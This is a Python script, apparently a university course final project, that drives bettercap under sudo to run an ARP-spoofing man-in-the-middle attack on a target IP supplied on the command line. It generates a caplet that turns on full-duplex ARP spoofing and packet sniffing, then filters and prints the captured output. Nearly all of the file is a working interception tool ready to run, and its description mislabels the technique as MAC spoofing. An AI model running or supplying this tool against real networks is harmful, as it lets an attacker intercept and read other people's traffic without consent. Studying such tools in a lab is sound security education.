import argparse
import subprocess
from random import choice
from string import ascii_letters
import re
import os
from glob import glob

def gen_cap(file_name, target_ip):
    with open(file_name, "w+") as file:
        lines = [
            "net.probe on\n",
            "set arp.spoof.fullduplex true\n", 
            f"set arp.spoof.targets {target_ip}\n",
            "arp.spoof on\n",
            "set net.sniff.local true\n",
            "net.sniff on"
        ]

        file.writelines(lines)

def clean(file_glob):
    for file in glob(file_glob):
        os.remove(file)

def isValidIP(ip):
    pattern = re.compile(r"\b(?:(?:2(?:[0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9])\.){3}(?:(?:2([0-4][0-9]|5[0-5])|[0-1]?[0-9]?[0-9]))\b", re.IGNORECASE)
    return pattern.match(ip)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        prog="mac-spoof",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description="A program which performs a MITM attack by spoofing the MAC address. (INFOST 695-001 Final Project)",
        epilog="Copyright © 2024 Hemanth Chinnappa, Kevin Agyei, Lauren Rodriguez, & Cedar Lehman.\nSee LICENSE file for more details."
    )
    parser.add_argument("target", help="IP of the computer you want to target")
    args = parser.parse_args()

    # test to see if IP is valid
    if not isValidIP(args.target):
        parser.error(f"target '{args.target}' is not a valid IP address")

    temp_file = '/tmp/mac-address-spoofer-' + ''.join(choice(ascii_letters) for i in range(10)) + '.cap'
    print(temp_file)

    gen_cap(temp_file, args.target)

    my_env = os.environ.copy()
    my_env["TERM"] = "dumb"
    process = subprocess.Popen(
        ["sudo", "bettercap", "--iface", "eth0", "--caplet", temp_file, "--eval", "set $ {reset}"],
        stdout=subprocess.PIPE,
        env=my_env
    )
    while True:
        output = process.stdout.readline()
        if output == '' and process.poll() is not None:
            break
        if output:
            ansi_escape = re.compile(r'/(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]/')
            line = ansi_escape.sub('', output.decode("utf-8")).rstrip("\n").split(" ")
            if not (line.__contains__("WARNING:") or line.__contains__("bettercap")):
                output = []
                for word in line:
                    if not (word.__contains__("[") or word.__contains__("arp.") or word.__contains__("net.")):
                        output.append(word)

                print(" ".join(output))

        rc = process.poll()
        
    clean("/tmp/mac-address-spoofer-*")
